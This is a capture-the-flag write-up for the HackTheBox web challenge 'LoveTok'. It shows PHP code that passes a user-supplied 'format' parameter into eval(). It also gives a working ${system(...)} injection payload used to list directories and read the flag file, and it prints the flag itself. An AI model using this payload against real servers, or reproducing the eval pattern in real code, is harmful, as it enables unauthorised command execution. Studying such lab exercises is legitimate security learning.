---
title: "LoveTok"
description: "True love is tough, and even harder to find. Once the sun has set, the lights close and the bell has rung... you find yourself licking your wounds and contemplating human existence. You wish to have somebody important in your life to share the experiences that come with it, the good and the bad. This is why we made LoveTok, the brand new service that accurately predicts in the threshold of milliseconds when love will come knockin' (at your door). Come and check it out, but don't try to cheat love because love cheats back. 💛"
pubDate: 2024-03-06
author: "sealldev"
section: "HackTheBox"
tags: ["easy", "hackthebox-challenge"]
---

**Challenge created by:** [makelarisjr](https://app.hackthebox.com/users/95) & [makelaris](https://app.hackthebox.com/users/107)

After opening the ZIP, we are given a website structure built with PHP.

```
$ ls
Dockerfile build_docker.sh* challenge/ config/ entrypoint.sh* flag
```

Looking inside `challenge`, specifically `challenge/controllers/TimeController.php`, we can see it takes an input of parameter 'format':
```php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : 'r';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```

In `challenge/models/TimeModel.php` it parses and utilises that input in the `getTime()` function called in `TimeController.php`.
```php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
```

This uses `eval` and the output is used on the webpage, so we could provide an input that will be evaluated as a command to read the flag.

Looking at ways to inject a command to avoid the 'format' conversion we get, I use `${}` to avoid that.

The payload I found worked consistently was: `?format=${system($_GET[0])}&0=whoami`.

I start by using `ls` and see the following response: `Router.php assets controllers index.php models static views`

Then I try `ls ..`: `bin boot dev entrypoint.sh etc flag6oJjz home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var www`

`flag6oJjz`, let's read it using `cat ../flag6oJjz`: HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}

Flag: `HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}`

![Success](images/htb/challenges/lovetok/submitted.png)